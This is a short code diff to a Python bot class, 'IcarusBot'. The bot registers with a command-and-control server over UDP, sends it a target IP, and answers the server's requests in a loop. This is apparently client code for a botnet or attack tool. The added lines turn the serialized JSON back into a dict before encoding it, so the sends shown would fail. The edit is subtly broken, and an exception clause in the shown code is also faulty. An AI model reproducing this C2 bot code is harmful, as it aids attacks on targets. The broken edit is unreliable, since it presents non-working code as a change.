@@ -103,7 +103,8 @@ class IcarusBot:
             'target': self.target_ip
         }
         init_message = json.dumps(init_message)
-        self.sock.sendto(str.encode(init_message), (self.c2_server_details[0], int(self.c2_server_details[1])))
+        loaded_init = json.loads(init_message)
+        self.sock.sendto(str.encode(loaded_init), (self.c2_server_details[0], int(self.c2_server_details[1])))
 
         # Now we just listen for message requests.
         while True:
@@ -123,6 +124,7 @@ class IcarusBot:
                         'target': self.target_ip
                     }
                     response = json.dumps(response)
+                    response = json.loads(response)
                 # This will then send the message back to the server, irrespective of the flag.
                 self.sock.sendto(str.encode(response), (self.c2_server_details[0], int(self.c2_server_details[1])))
             except timeout or Exception:
